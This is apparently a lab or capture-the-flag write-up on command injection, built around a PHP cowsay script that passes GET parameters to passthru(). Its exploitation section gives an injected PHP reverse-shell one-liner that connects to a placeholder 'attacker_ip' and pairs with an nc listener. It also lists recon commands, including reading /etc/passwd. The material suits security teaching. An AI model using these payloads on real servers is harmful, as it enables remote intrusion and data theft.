Command injection occurs when web applications execute system commands using unsanitized user input, enabling attackers to run arbitrary OS commands.

  The provided example involves a PHP script using the passthru() function to run the cowsay command with user-controlled parameters, illustrating a security flaw.

Attackers can exploit inline bash commands $(your_command) within input fields to execute malicious commands on the server.

Common commands used in exploits include whoami, id, ifconfig/ip addr, uname -a, and ps -ef, which help attackers gather system information.

Successful exploitation allows attackers to enumerate files, identify users, and gain information about the server environment, potentially escalating their access.

Proper input validation, parameter sanitization, and avoiding direct command execution with user input are critical to prevent command injection.

The scenario encourages exploiting the vulnerability to answer several security questions related to system configuration, user accounts, and installed software.
example of the code is

```bash
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```
here are some other commands you may want to try to test for command injection on the web application:

```bash
whoami
id
ifconfig/ip addr
uname -a
ps -ef
```
EXPLOITATION TIME:

First is to create a reverse shell on the terminal for command execution in that case I shall use a cheat sheet i.e [cheat-sheet](swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#ruby)

where we paste this ```$(php -r '$sock=fsockopen("attacker_ip",port_NO);exec("/bin/sh -i <&3 >&3 2>&3");')``` ,also this command may work ```php -r '$sock=fsockopen("attacker_ip",port_NO);exec("/bin/sh -i <&3 >&3 2>&3");'```

on the command prompt on the web while we listen using nc port listener in order to access the shell.

After having an interactive shell we can then run several commands that is:

```bash
whoami  # shows the user

ls  #shows the available files and directories on that user

cat /etc/passwd  # shows the available users and there privileges

cat /etc/os-release  # shows the os version running on the web server
```





















































